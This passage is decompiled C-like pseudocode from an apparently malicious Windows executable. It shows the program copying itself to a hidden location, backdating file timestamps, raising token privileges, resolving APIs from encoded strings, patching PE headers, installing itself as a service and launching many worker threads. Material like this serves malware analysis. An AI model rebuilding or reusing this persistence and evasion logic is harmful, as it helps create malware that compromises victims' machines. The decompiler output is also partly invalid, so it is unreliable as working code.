		esp_124->tFFFFFFFC.u0 = 0x04;
		esp_124->tFFFFFFF8.u0 = 0x02;
		esp_124->tFFFFFFF4.u0 = (BOOL) (ebp_115 - 24);
		esp_124->tFFFFFFF4.u0 = fn00407840(esp_124->tFFFFFFF4.u0).u0 + (ebp_115 - 24) / 0x00001000;
		fn0040372F(esp_124->tFFFFFFF4.u0, esp_124->tFFFFFFF8.u0, esp_124->tFFFFFFFC.u0, esp_124->t0000.u0);
		esp_124->tFFFFFFF0.u0 = (BOOL) (ebp_115 - 23);
		ebp_115 = fn0040C9AC(esp_124->tFFFFFFF0.u0);
		Eq_2 esp_179 = <invalid>;
		esp_179.u0->dwFFFFFFFC = (word32) (ebp_115 - 0x051C);
		esp_179.u0->dwFFFFFFF8 = (word32) (ebp_115 - 0x0418);
		fn00407750(esp_179.u0->dwFFFFFFF8, esp_179.u0->dwFFFFFFFC);
		&((word32) esp_179 - 0x0C)->u0->dw0000 = 0x0040F044;
		*((word32) esp_179 - 16) = ebp_115 - 0x0418;
		fn00407760(*((word32) esp_179 - 16), *((word32) esp_179 - 0x0C));
		*((word32) esp_179 - 20) = ebp_115 - 24;
		*((word32) esp_179 - 24) = ebp_115 - 0x0418;
		fn00407760(*((word32) esp_179 - 24), *((word32) esp_179 - 20));
		&((word32) esp_179 - 28)->u0->dw0000 = 0x004101DC;
		*((word32) esp_179 - 32) = ebp_115 - 0x0418;
		fn00407760(*((word32) esp_179 - 32), *((word32) esp_179 - 28));
		*((word32) esp_179 - 36) = ebp_115 - 0x0418;
		esp_110 = &esp_179.u0->ptr0014;
		if (fn00403E63(*((word32) esp_179 - 36)) == 0x00)
			break;
	}
	*((word32) esp_179 + 16) = ebp_115 - 24;
	&((word32) esp_179 + 0x0C)->u0->dw0000 = 4797404;
	fn00407760(*((word32) esp_179 + 0x0C), *((word32) esp_179 + 16));
	*((word32) esp_179 + 8) = ebp_115 - 0x0418;
	esp_179.u0->dw0004 = 4797924;
	fn00407750(esp_179.u0->dw0004, *((word32) esp_179 + 8));
}

// 00404C49: Register word32 fn00404C49(Register out ptr32 ecxOut)
// Called from:
//      fn004073E2
word32 fn00404C49(ptr32 & ecxOut)
{
	Eq_1888 tLoc0414;
	Eq_1889 tLoc0310;
	Eq_1890 tLoc020C;
	Eq_1891 tLoc0108;
	fn00407750(&tLoc0310, 4797924);
	GetModuleFileNameA(0x00, &tLoc0108, 0x0104);
	fn004078BB(&tLoc0310, 0x00, &tLoc0414, 0x00, 0x00);
	ptr32 ecx_92;
	word32 eax_104 = !fn0040C920(fn004078BB(&tLoc0108, 0x00, &tLoc020C, 0x00, 0x00), &tLoc0414, &tLoc020C, out ecx_92);
	ecxOut = ecx_92;
	return eax_104;
}

// 00404CC5: Register ui32 fn00404CC5(Stack (ptr32 Eq_1061) dwArg04, Stack up32 dwArg08)
// Called from:
//      fn00404D04
//      fn00404FC5
//      fn00405108
ui32 fn00404CC5(struct Eq_1061 * dwArg04, up32 dwArg08)
{
	if (dwArg08 < 0x44 || (dwArg04->w0000 != 77 || dwArg04->b0001 != 0x5A))
		return 0x00;
	word32 * eax_16 = dwArg04 + (word32) dwArg04[30] / 2;
	uint32 edx_19 = eax_16 - dwArg04;
	if (edx_19 > dwArg08 + ~0x03)
		return 0x00;
	return (word32) (*eax_16 != 0x4550) - 1 & edx_19;
}

// 00404D04: Register (ptr32 Eq_1974) fn00404D04(Stack (ptr32 Eq_1061) dwArg04, Stack uint32 dwArg08, Stack up32 dwArg0C)
// Called from:
//      fn00404FC5
struct Eq_1974 * fn00404D04(struct Eq_1061 * dwArg04, uint32 dwArg08, up32 dwArg0C)
{
	struct Eq_1974 * eax_143;
	ptr32 eax_23 = fn00404CC5(dwArg04, dwArg0C);
	if (eax_23 != 0x00)
	{
		struct Eq_1986 * ecx_38 = dwArg04 + eax_23 / 2;
		uint32 edx_40 = ecx_38->dw0074;
		if (edx_40 >= dwArg08)
		{
			up32 ecx_44 = (word32) ecx_38->w0006;
			up32 esi_45 = ecx_38->a0070[dwArg08].dw0000;
			up32 edi_47 = 0x00;
			eax_143 = (struct Eq_1974 *) (&ecx_38->dw0074 + 3 + (edx_40 * 0x08) / 0x0078);
			if (ecx_44 > 0x00)
			{
				do
				{
					if (eax_143 - dwArg04 >= dwArg0C + ~0x03)
						goto l00404D6D;
					up32 edx_64 = eax_143->dw0004;
					if (eax_143->dw0000 + edx_64 > esi_45 && edx_64 <= esi_45)
						break;
					++eax_143;
					++edi_47;
				} while (edi_47 < ecx_44);
				if (edi_47 < ecx_44)
					return eax_143;
			}
		}
	}
l00404D6D:
	eax_143 = null;
	return eax_143;
}

// 00404FC5: void fn00404FC5(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00406DFD
void fn00404FC5(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_2035 tLoc18;
	Eq_2036 tLoc08;
	fn0040174B();
	word32 esi_18 = 0x00;
	struct Eq_1061 * eax_31 = fn0040174E(&tLoc18, dwArg04, &tLoc08, 0x00);
	if (eax_31 == null)
		return;
	Eq_2 edi_129;
	ptr32 eax_50 = fn00404CC5(eax_31, tLoc08);
	if (eax_50 != 0x00)
	{
		struct Eq_2059 * eax_73 = fn00404D04(eax_31, 0x03, tLoc08);
		if (eax_73 != null)
		{
			struct Eq_2070 * esi_91 = eax_31 + eax_50 / 2;
			esi_91->dw008C = 0x10;
			word32 ecx_95 = eax_73->dw0004;
			eax_73->dw0000 = 0x10;
			eax_73->dw0008 = 0x10;
			ui32 ecx_106 = ecx_95 + 0x10;
			if (((word16) ecx_95 + 0x10 & 0x0FFF) != 0x00)
				ecx_106 = (ecx_95 + 0x10 >> 0x0C) + 0x01 << 0x0C;
			esi_91->dw0050 = ecx_106;
			word32 ecx_112 = eax_73->dw000C;
			dwArg08 = eax_73->dw0008 + ecx_112;
			edi_129 = dwArg08;
			if (((word16) dwArg08 & 0x0FFF) != 0x00)
				edi_129 = (dwArg08 >> 0x0C) + 0x01 << 0x0C;
			Eq_2 eax_139 = eax_31 + ecx_112 / 2;
			if (eax_139 - eax_31 < tLoc08)
				fn004076F0(eax_139, 0x00, 0x10);
			word32 eax_174 = esi_91->dw00EC;
			if (eax_174 != 0x00)
				esi_91->dw0028 = eax_174;
			esi_18 = 0x01;
l0040508E:
			fn00401808(&tLoc18);
			if (esi_18 != 0x00)
			{
				word32 esi_352;
				word32 edi_353;
				fn0040406E(&tLoc18, dwArg04, edi_129, out esi_352, out edi_353);
			}
			fn00405108(dwArg04);
			return;
		}
	}
	edi_129 = dwArg04;
	goto l0040508E;
}

// 004050B5: Register word32 fn004050B5(Stack (ptr32 Eq_1061) dwArg04, Stack uint32 dwArg08)
// Called from:
//      fn00405108
word32 fn004050B5(struct Eq_1061 * dwArg04, uint32 dwArg08)
{
	uint32 ecx_12 = 0x00;
	uint32 dwLoc08_66 = 0x00;
	if (dwArg08 >> 0x01 != 0x00)
	{
		struct Eq_1061 * edx_17 = dwArg04;
		uint32 esi_21 = dwArg08 >> 0x01;
		do
		{
			uint32 ecx_26 = ecx_12 + (word32) edx_17->w0000;
			ecx_12 = (ecx_26 & 0xFFFF) + (ecx_26 >> 0x10);
			++edx_17;
			--esi_21;
		} while (esi_21 != 0x00);
		dwLoc08_66 = ecx_12;
	}
	return SEQ(SLICE(ecx_12 >> 0x10, word16, 16), (word16) ((ecx_12 >> 0x10) + dwLoc08_66)) + dwArg08;
}

// 00405108: void fn00405108(Stack Eq_2 dwArg04)
// Called from:
//      fn00404FC5
void fn00405108(Eq_2 dwArg04)
{
	Eq_2206 tLoc18;
	Eq_2207 tLoc08;
	fn0040174B();
	tLoc08 = (Eq_2207) 0x00;
	struct Eq_1061 * eax_34 = fn0040174E(&tLoc18, dwArg04, &tLoc08, 0x00);
	if (eax_34 != null)
	{
		ptr32 eax_52 = fn00404CC5(eax_34, tLoc08);
		if (eax_52 != 0x00)
		{
			word32 * esi_68 = eax_34 + (eax_52 + 88) / 2;
			if (eax_34[(eax_52 + 88) / 2] != 0x00)
			{
				*esi_68 = 0x00;
				*esi_68 = fn004050B5(eax_34, tLoc08);
			}
		}
		fn00401808(&tLoc18);
	}
}

// 00405449: void fn00405449(Stack Eq_2 tArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn004055FE
void fn00405449(Eq_2 tArg04, Eq_2 dwArg08)
{
	Eq_2261 tLoc0664;
	Eq_2262 tLoc24;
	Eq_2 tLoc14;
	Eq_2264 tLoc10;
	Eq_2 eax_18 = tArg04;
	&tLoc14.u0->dw0000 = 0x0640;
	if (eax_18 == 0x00)
		eax_18 = GetCurrentProcess();
	if (OpenProcessToken(eax_18, 0x28, &tArg04) != 0x00)
	{
		if (LookupPrivilegeValueA(0x00, dwArg08, &tLoc10) != 0x00)
		{
			tLoc24.Privileges[0].Luid.LowPart = tLoc10.LowPart;
			tLoc24.t0008 = (Eq_2319) tLoc10.HighPart;
			tLoc24.PrivilegeCount = (DWORD) 0x00;
			Eq_2 v17_77 = tArg04;
			tLoc24.dw000C = 0x00;
			AdjustTokenPrivileges(v17_77, 0x00, &tLoc24, 0x10, &tLoc0664, &tLoc14);
			if (GetLastError() == 0x00)
			{
				union Eq_2375 eax_89[1] = tLoc10.LowPart;
				tLoc0664.dw000C = tLoc0664.dw000C | 0x02;
				tLoc0664.Privileges[0].Luid.LowPart = (DWORD) eax_89;
				tLoc0664.t0008 = (Eq_2380) tLoc10.HighPart;
				tLoc0664.PrivilegeCount = (DWORD) 0x01;
				AdjustTokenPrivileges(tArg04, 0x00, &tLoc0664, 0x10, null, null);
				GetLastError() != 0x00;
			}
		}
		CloseHandle(tArg04);
	}
}

// 00405522: void fn00405522(Stack Eq_2 dwArg04)
// Called from:
//      fn00406DFD
void fn00405522(Eq_2 dwArg04)
{
	Eq_2414 tLoc1C;
	Eq_2415 tLoc0C;
	Eq_2 eax_31 = CreateFileA(dwArg04, 0xC0000000, 0x01, null, 0x03, 0x20, 0x00);
	if (eax_31 != 0x00)
	{
		GetSystemTime(&tLoc1C);
		tLoc1C.wMinute = (WORD) (word16) ((uint64) fn004047B6(0x00) % 0x3C);
		tLoc1C.wHour = (WORD) (tLoc1C.wHour - (word16) ((uint64) fn004047B6(0x00) % 0x18));
		if (tLoc1C.wHour <= 0x00)
		{
			tLoc1C.wHour = (WORD) (tLoc1C.wHour + 0x18);
			tLoc1C.wDay = (WORD) (tLoc1C.wDay - 0x01);
		}
		tLoc1C.wDay = (WORD) (tLoc1C.wDay - (word16) ((uint64) fn004047B6(0x00) % 0x1C));
		if (tLoc1C.wDay <= 0x00)
			tLoc1C.wDay = (WORD) (word16) ((uint64) fn004047B6(0x00) % 0x03);
		tLoc1C.wMonth = (WORD) (tLoc1C.wMonth - (word16) ((uint64) fn004047B6(0x00) % 0x0C));
		if (tLoc1C.wMonth <= 0x00)
		{
			tLoc1C.wMonth = (WORD) (tLoc1C.wMonth + 0x0C);
			tLoc1C.wYear = (WORD) (tLoc1C.wYear - 0x01);
		}
		SystemTimeToFileTime(&tLoc1C, &tLoc0C);
		SetFileTime(eax_31, &tLoc0C, &tLoc0C, &tLoc0C);
		CloseHandle(eax_31);
	}
}

// 004055FE: Register Eq_2 fn004055FE(Register out ptr32 ebxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut, Register out Eq_2 ediOut)
// Called from:
//      fn004073E2
Eq_2 fn004055FE(ptr32 & ebxOut, ptr32 & ebpOut, ptr32 & esiOut, union Eq_2 & ediOut)
{
	Eq_2594 tLoc98;
	fn004047B6(0x01);
	fn004076F0(4798444, 0x00, 0x0104);
	fn004076F0(4798184, 0x00, 0x0104);
	fn004076F0(4797924, 0x00, 0x0104);
	fn004076F0(4797664, 0x00, 0x0104);
	fn004076F0(4797404, 0x00, 0x0104);
	fn00403634(0x0040F0D4, 0x2266, &g_t40F0D0);
	Eq_2629 edi_125;
	Eq_2629 ebx_123 = fn00402680(&g_t4938F8, out edi_125);
	Eq_2 eax_133 = GetVersion();
	g_t493900 = edi_125;
	g_t4938F0.u0 = (BOOL) (eax_133 & 0x80000000);
	tLoc98.dwOSVersionInfoSize = (DWORD) 0x94;
	GetVersionExA(&tLoc98);
	if (tLoc98.dwMajorVersion == 0x05 && tLoc98.dwMinorVersion == ebx_123)
		g_t493900 = ebx_123;
	Eq_2 eax_226;
	Eq_2 edi_153;
	ptr32 * ebp_156;
	Eq_2 ebx_151 = fn00404A18(out ebp_156, out edi_153);
	Eq_2 esp_157 = (struct Eq_10346 *) <invalid>;
	esp_157.u0->dwFFFFFFFC = 0x0007D000;
	Eq_2 eax_166 = fn00407F8F(esp_157.u0->dwFFFFFFFC);
	g_t4933D8.u0 = (BOOL) eax_166;
	if (eax_166 == edi_153)
		&eax_226.u0->dw0000 = 0x00;
	else
	{
		esp_157.u0->dwFFFFFFFC = 0x0007D000;
		esp_157.u0->dwFFFFFFF8 = (word32) edi_153;
		*((word32) esp_157 - 0x0C) = eax_166;
		fn004076F0(*((word32) esp_157 - 0x0C), *((word32) esp_157 - 8), esp_157.u0->dwFFFFFFFC);
		fn004057BE();
		*((word32) esp_157 - 16) = ebx_151;
		&((word32) esp_157 - 20)->u0->dw0000 = 0x00410E04;
		*((word32) esp_157 - 24) = fn0040347E(*((word32) esp_157 - 20), *((word32) esp_157 - 16));
		*((word32) esp_157 - 28) = edi_153;
		fn00405449(*((word32) esp_157 - 28), *((word32) esp_157 - 24));
		eax_226 = ebx_151;
	}
	Eq_2 edi_233 = esp_157.u0->dw0000;
	ptr32 esi_235 = esp_157.u0->dw0004;
	ptr32 ebp_240 = *ebp_156;
	ebxOut = (ptr32) *((word32) esp_157 + 8);
	ebpOut = ebp_240;
	esiOut = esi_235;
	ediOut = edi_233;
	return eax_226;
}

// 00405705: void fn00405705(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00406DFD
void fn00405705(Eq_2 dwArg04, Eq_2 dwArg08)
{
	ptr32 fp;
	Eq_2765 tLoc18;
	Eq_2766 tLoc08;
	fn0040174B();
	ptr32 ebp_113 = fp - 4;
	struct Eq_1061 * eax_24 = fn0040174E(&tLoc18, dwArg04, &tLoc08, 0x00);
	if (eax_24 != null)
	{
		up32 esi_149 = 0x1000;
		if (tLoc08 >= 0x1000)
		{
			Eq_2 eax_49 = fn00407840(dwArg08);
			if (tLoc08 > 0x13E8)
			{
				do
				{
					if (fn00408420(dwArg08, eax_24 + esi_149 / 2, eax_49) == 0x00)
					{
						Eq_2 edi_88 = eax_24 + (esi_149 + 20) / 2;
						fn00403634(edi_88, 0x2266, edi_88 - 4);
						word32 edi_115;
						int32 esi_117;
						ebp_113 = fn00407C00(edi_88, &dwArg08.u0->ptr0014, 0x2266, out esi_117, out edi_115);
						fn004035A1(edi_88 - 4);
						fn004035D8(edi_115, esi_117, edi_88 - 4);
						break;
					}
					++esi_149;
				} while (esi_149 < (word32) tLoc08 - 1000);
			}
		}
		fn00401808(ebp_113 - 20);
	}
}

// 004057BE: void fn004057BE()
// Called from:
//      fn004055FE
void fn004057BE()
{
	ptr32 fp;
	Eq_2 eax_35 = LoadLibraryA(fn0040347E(0x00410B93, 0x02));
	if (eax_35 != 0x00)
	{
		g_t493908.u0 = (BOOL) GetProcAddress(eax_35, fn0040347E(0x00410C93, 0x01));
		g_t493904.u0 = (BOOL) GetProcAddress(eax_35, fn0040347E(0x00410C93, 0x04));
		g_t49390C.u0 = (BOOL) GetProcAddress(eax_35, fn0040347E(0x00410C93, 0x05));
	}
	ptr32 esp_130 = fp - 0x14;
	Eq_2 eax_133 = LoadLibraryA(fn0040347E(0x00410B93, 0x03));
	if (eax_133 != 0x00)
	{
		g_t493910.u0 = (BOOL) GetProcAddress(eax_133, fn0040347E(0x00410C93, 0x03));
		esp_130 = fp - 0x1C;
	}
	struct Eq_2910 * esp_165 = esp_130 - 4;
	esp_165->t0000.u0 = 4263368;
	Eq_2 eax_168 = LoadLibraryA(esp_165->t0000);
	if (eax_168 != 0x00)
	{
		esp_165->tFFFFFFFC.u0 = 0x01;
		esp_165->tFFFFFFF8.u0 = 4263368;
		esp_165->tFFFFFFFC.u0 = (BOOL) fn0040347E(esp_165->tFFFFFFF8.u0, esp_165->tFFFFFFFC.u0);
		esp_165->tFFFFFFF8.u0 = (BOOL) eax_168;
		g_t493914.u0 = (BOOL) GetProcAddress(esp_165->tFFFFFFF8.u7, esp_165->tFFFFFFFC);
	}
}

// 00405B0F: Register word32 fn00405B0F(Stack Eq_2 dwArg04, Register out (ptr32 ptr32) ebpOut)
// Called from:
//      fn004073E2
word32 fn00405B0F(Eq_2 dwArg04, ptr32 & ebpOut)
{
	ptr32 fp;
	Eq_2979 tLoc0328;
	Eq_2980 tLoc0224;
	Eq_2981 tLoc0120;
	Eq_2982 tLoc1C;
	Eq_2983 tLoc0C;
	Eq_2984 tLoc08;
	word32 eax_228;
	fn0040174B();
	tLoc08 = (Eq_2984) 0x00;
	ptr32 ** ebp_174 = fp - 4;
	struct Eq_1061 * eax_29 = fn0040174E(&tLoc1C, dwArg04, &tLoc0C, 0x01);
	if (eax_29 != null)
	{
		fn004078BB(dwArg04, &tLoc0120, &tLoc0328, fp - 0x042C, &tLoc0224);
		fn00407760(&tLoc0120, &tLoc0328);
		fn00407760(&tLoc0120, fp - 0x042C);
		fn00407760(&tLoc0120, fp - 0x0223);
		fn00407760(&tLoc0120, 0x004101DC);
		Eq_2 eax_137 = fn0040756C(eax_29, tLoc0C, &tLoc08);
		if (eax_137 != 0x00)
		{
			fn00401808(&tLoc1C);
			fn00403DC6(&tLoc0120, eax_137, tLoc08.u0);
			ebp_174 = fn00407BEB(eax_137);
			word32 esi_185 = 0x00;
			Eq_2 eax_195 = fn004047E2(ebp_174 - 0x011C, GetCommandLineA());
			if (eax_195 != 0x00)
			{
				WaitForSingleObject(eax_195, ~0x00);
				fn00403F05(ebp_174 - 0x011C);
				esi_185 = 0x01;
			}
			eax_228 = esi_185;
l00405C2B:
			ebpOut = *ebp_174;
			return eax_228;
		}
		fn00401808(&tLoc1C);
	}
	eax_228 = 0x00;
	goto l00405C2B;
}

DWORD g_t406066(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00406066
DWORD g_t406608(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00406608
DWORD g_t406DDE(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00406DDE
// 00406DFD: Register Eq_2 fn00406DFD(Register Eq_2 ebx, Register Eq_2 ebp, Register Eq_2 esi, Register Eq_2 edi)
// Called from:
//      fn004073E2
Eq_2 fn00406DFD(Eq_2 ebx, Eq_2 ebp, Eq_2 esi, Eq_2 edi)
{
	Eq_2 dwLoc04;
	Eq_2 dwLoc2384;
	word32 dwLoc238C;
	fn00407F60(9092, dwLoc04);
	Eq_2 esp_7 = (struct Eq_10346 *) <invalid>;
	esp_7.u0->dwFFFFFFFC = (word32) ebx;
	esp_7.u0->dwFFFFFFF8 = (word32) ebp;
	*((word32) esp_7 - 0x0C) = esi;
	*((word32) esp_7 - 16) = edi;
	&((word32) esp_7 - 20)->u0->dw0000 = 0x0104;
	&((word32) esp_7 - 24)->u0->dw0000 = &esp_7.u0->dw0004;
	&((word32) esp_7 - 28)->u0->dw0000 = 0x00;
	GetModuleFileNameA(*((word32) esp_7 - 28), *((word32) esp_7 - 24), *((word32) esp_7 - 20));
	&((word32) esp_7 - 20)->u0->dw0000 = 0x20;
	&((word32) esp_7 - 24)->u0->dw0000 = 4797924;
	SetFileAttributesA(*((word32) esp_7 - 24), *((word32) esp_7 - 20));
	&((word32) esp_7 - 20)->u0->dw0000 = 0x00;
	&((word32) esp_7 - 24)->u0->dw0000 = 4797924;
	&((word32) esp_7 - 28)->u0->dw0000 = &esp_7.u0->dw0004;
	Eq_2 eax_50 = CopyFileA(*((word32) esp_7 - 28), *((word32) esp_7 - 24), *((word32) esp_7 - 20));
	&((word32) esp_7 - 20)->u0->dw0000 = 0x20;
	&((word32) esp_7 - 24)->u0->dw0000 = 4797924;
	esp_7.u0->dw0000 = (word32) eax_50;
	SetFileAttributesA(*((word32) esp_7 - 24), *((word32) esp_7 - 20));
	Eq_2 ebx_129 = 0x00;
	<anonymous> * edi_132 = SetFileAttributesA;
	Eq_2 esi_130 = 4797924;
	ptr32 esp_138 = esp_7 - 0x10;
	if (esp_7.u0->dw0000 != 0x00)
	{
		&((word32) esp_7 - 20)->u0->dw0000 = 0x227A;
		&((word32) esp_7 - 24)->u0->dw0000 = 0x0040F0C0;
		&((word32) esp_7 - 28)->u0->dw0000 = (word32) esp_7 + 264;
		Eq_2 esi_73;
		word32 edi_448;
		fn00407C00(*((word32) esp_7 - 28), *((word32) esp_7 - 24), *((word32) esp_7 - 20), out esi_73, out edi_448);
		&((word32) esp_7 + 0x0000111C)->u0->dw0000 = 0x00;
		&((word32) esp_7 - 32)->u0->dw0000 = (word32) esp_7 + 264;
		*((word32) esp_7 - 36) = esi_73;
		fn00405705(*((word32) esp_7 - 36), *((word32) esp_7 - 32));
		Eq_2 esp_91 = (struct Eq_10346 *) <invalid>;
		esp_91.u0->dwFFFFFFFC = 0x00015000;
		esp_91.u0->dwFFFFFFF8 = (word32) esi_73;
		fn00404FC5(esp_91.u0->dwFFFFFFF8, esp_91.u0->dwFFFFFFFC);
		&((word32) esp_91 - 0x0C)->u0->dw0000 = 0x00;
		*((word32) esp_91 - 16) = (uint32) ((uint64) fn004047B6(*((word32) esp_91 - 0x0C)) % 0x2800) + 0x00015200;
		*((word32) esp_91 - 20) = esi_73;
		ebx_129 = fn0040406E((struct Eq_1082 *) 0x2800, *((word32) esp_91 - 20), *((word32) esp_91 - 16), out esi_130, out edi_132);
		esp_138 = &esp_91.u0->ptr0014;
	}
	struct Eq_3231 * esp_141 = esp_138 - 4;
	esp_141->t0000.u0 = (BOOL) esi_130;
	fn00405522(esp_141->t0000.u0);
	Eq_2 ecx_151 = esp_141->t0000.u0;
	esp_141->t0000.u0 = 0x27;
	esp_141->tFFFFFFFC.u0 = (BOOL) esi_130;
	struct Eq_3254 * esp_161;
	edi_132();
	if (g_t4938F0.u0 != ebx_129)
	{
		esp_161->tFFFFFFFC.u0 = (BOOL) esi_130;
		esp_161->tFFFFFFF8.u0 = 4797404;
		esp_161->tFFFFFFF4.u0 = 4797664;
		esp_161->tFFFFFFF0.u0 = 0x80000002;
		fn0040464B(esp_161->tFFFFFFF0.u0, esp_161->tFFFFFFF4.u7, esp_161->tFFFFFFF8.u0, esp_161->tFFFFFFFC.u0);
		esp_161->tFFFFFFEC.u0 = 0x01;
		esp_161->tFFFFFFE8.u0 = 0x00410B93;
		esp_161->tFFFFFFFC.u0 = (BOOL) fn0040347E(esp_161->tFFFFFFE8.u0, esp_161->tFFFFFFEC.u0);
		Eq_2 eax_201 = LoadLibraryA(esp_161->tFFFFFFFC);
		esp_161->tFFFFFFFC.u0 = 0x00410C93;
		esp_161->tFFFFFFF8.u0 = (BOOL) eax_201;
		Eq_2 eax_208 = GetProcAddress(esp_161->tFFFFFFF8.u7, esp_161->tFFFFFFFC);
		struct Eq_3254 * esp_209 = esp_161;
		if (eax_208 != ebx_129)
		{
			esp_161->tFFFFFFFC.u0 = 0x01;
			esp_161->tFFFFFFF8.u0 = (BOOL) ebx_129;
			eax_208();
			esp_209 = esp_161 - 8;
		}
		union Eq_2 * esp_223 = esp_209 - 4;
		esp_223->u0 = (BOOL) eax_201;
		FreeLibrary(esp_223->u7);
	}
	if (dwLoc2384 != ebx_129)
	{
		if (g_t4938F0.u0 != ebx_129)
			fn004047E2(esi_130, ebx_129);
		else if (g_t4938F8.u0 == ebx_129)
		{
			Eq_3466 eax_245 = OpenSCManagerA(ebx_129, ebx_129, 0x02);
			CreateServiceA(eax_245, 4797404, 4797404, ebx_129, 0x0110, 0x02, ebx_129, esi_130, ebx_129, ebx_129, ebx_129, ebx_129, ebx_129);
			CloseServiceHandle(eax_245);
			Eq_3466 eax_292 = OpenSCManagerA(ebx_129, ebx_129, 0x01);
			Eq_3466 eax_301 = OpenServiceA(eax_292, 4797404, 0x10);
			StartServiceA(eax_301, ebx_129, ebx_129);
			CloseServiceHandle(eax_301);
			CloseServiceHandle(eax_292);
		}
	}
	return dwLoc238C;
}

DWORD g_t406F88(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00406F88
DWORD g_t406FD5(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00406FD5
// 004071C3: void fn004071C3()
// Called from:
//      fn004072F2
void fn004071C3()
{
	while (true)
		Sleep(~0x00);
}

DWORD g_t4071CD(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 004071CD
// 004072F2: void fn004072F2(Register word32 ecx)
// Called from:
//      fn004073E2
void fn004072F2(word32 ecx)
{
	Eq_2 tLoc08;
	&tLoc08.u0->dw0000 = ecx;
	CreateThread(null, 0x00, &g_t4015FF, 0x00, 0x00, &tLoc08);
	CreateThread(null, 0x00, &g_t406608, 0x00, 0x00, &tLoc08);
	CreateThread(null, 0x00, &g_t406DDE, 0x00, 0x00, &tLoc08);
	CreateThread(null, 0x00, &g_t406066, 0x00, 0x00, &tLoc08);
	CreateThread(null, 0x00, &g_t4071CD, 0x00, 0x00, &tLoc08);
	CreateThread(null, 0x00, &g_t406FD5, 0x00, 0x00, &tLoc08);
	Eq_2 ebx_112 = 0x00;
	do
	{
		CreateThread(null, 0x00, &g_t406F88, ebx_112, 0x00, &tLoc08);
		&ebx_112.u0->dw0000 = &ebx_112.u5->b0001;
	} while (ebx_112 < 0x1A);
	fn004071C3();
}

// 004073E2: Register word32 fn004073E2(Register out ptr32 ebpOut)
// Called from:
//      Win32CrtStartup
word32 fn004073E2(ptr32 & ebpOut)
{
	ptr32 fp;
	WS2_32.dll!Ordinal_115(0x02, fp - 0x01A4);
	Eq_2 esp_28 = (struct Eq_10346 *) <invalid>;
	Eq_2 ebx_23;
	Eq_2 edi_25;
	Eq_2 esi_27;
	Eq_2 ebp_112;
	if (fn004055FE(out ebx_23, out ebp_112, out esi_27, out edi_25) != 0x00)
	{
		ebp_112 = fn00406DFD(ebx_23, ebp_112, esi_27, edi_25);
		if (g_b4100D4 != 0x00)
		{
			esp_28.u0->dwFFFFFFFC = 0x004100D4;
			Eq_2 esp_61 = (struct Eq_10346 *) <invalid>;
			&esp_28.u0->dw0000 = &esp_61.u0->dw0004;
			if (fn00405B0F(esp_28.u0->dwFFFFFFFC, out ebp_112) != 0x00)
				goto l00407457;
		}
		if (g_t4938F8.u0 != 0x00)
		{
			ebp_112.u0->dwFFFFFFF8 = 0x00;
			ebp_112.u0->dwFFFFFFFC = 0x00;
			&((word32) ebp_112 - 16)->u0->dw0000 = 4797404;
			SERVICE_TABLE_ENTRYA ** esp_88 = esp_28 - 4;
			*esp_88 = (SERVICE_TABLE_ENTRYA **) (ebp_112 - 16);
			&((word32) ebp_112 - 0x0C)->u0->dw0000 = 4223939;
			StartServiceCtrlDispatcherA(*esp_88);
		}
		word32 ecx_96;
		if (fn00404C49(out ecx_96) != 0x00)
			fn004072F2(ecx_96);
	}
l00407457:
	ebpOut = ebp_112.u0->dw0000;
	return 0x00;
}

// 0040756C: Register Eq_2 fn0040756C(Stack (ptr32 Eq_1061) dwArg04, Stack uint32 dwArg08, Stack (ptr32 Eq_2) dwArg0C)
// Called from:
//      fn00405B0F
Eq_2 fn0040756C(struct Eq_1061 * dwArg04, uint32 dwArg08, union Eq_2 * dwArg0C)
{
	Eq_2 eax_105;
	uint32 eax_19 = dwArg04->w0000;
	Eq_2 edx_102 = 0x00;
	up32 dwLoc08_221 = 0x00;
	if (dwArg08 < (eax_19 << 0x03) + 4)
		&eax_105.u0->dw0000 = 0x00;
	else
	{
		if (eax_19 > 0x00)
		{
			struct Eq_3771 * esi_35 = dwArg04 + 2;
			uint32 dwArg04_225 = eax_19;
			do
			{
				Eq_2 ecx_39 = esi_35->dw0000;
				if (edx_102 < ecx_39)
				{
					up32 ecx_43 = ecx_39 - edx_102;
					&edx_102.u0->dw0000 = edx_102.u0 + ecx_43 / 0x00001000;
					dwLoc08_221 += ecx_43;
				}
				up32 eax_51 = esi_35->dw0004;
				if (eax_51 > 0x00)
					&edx_102.u0->dw0000 = edx_102.u0 + eax_51 / 0x00001000;
				uint32 v18_66 = dwArg04_225 - 0x01;
				++esi_35;
				dwArg04_225 = v18_66;
			} while (v18_66 != 0x00);
		}
		up32 eax_77 = dwArg08 - (eax_19 << 0x03);
		if (dwLoc08_221 < eax_77 + ~0x03)
			&edx_102.u0->dw0000 = edx_102.u0 + ((eax_77 + ~0x03) - dwLoc08_221) / 0x00001000;
		dwArg0C->u0 = (BOOL) edx_102;
		byte * esi_129 = null;
		byte dwLoc08_246[] = null;
		eax_105 = fn00407F8F(edx_102);
		int32 edi_119 = dwArg04 + ((eax_19 << 0x03) + 4) / 2;
		uint32 ebx_120 = eax_19;
		if (eax_19 > 0x00)
		{
			struct Eq_3821 * ecx_128 = dwArg04 + 2;
			do
			{
				for (; esi_129 < ecx_128->dw0000; ++esi_129)
				{
					Mem188[eax_105 + esi_129:byte] = Mem131[dwLoc08_246 + edi_119:byte];
					dwLoc08_246 = (byte (*)[]) (dwLoc08_246 + 1);
				}
				up32 edx_134 = 0x00;
				if (ecx_128->dw0004 > 0x00)
				{
					do
					{
						Mem141[eax_105 + esi_129:byte] = 0x00;
						++esi_129;
						++edx_134;
					} while (edx_134 < ecx_128->dw0004);
				}
				++ecx_128;
				--ebx_120;
			} while (ebx_120 != 0x00);
		}
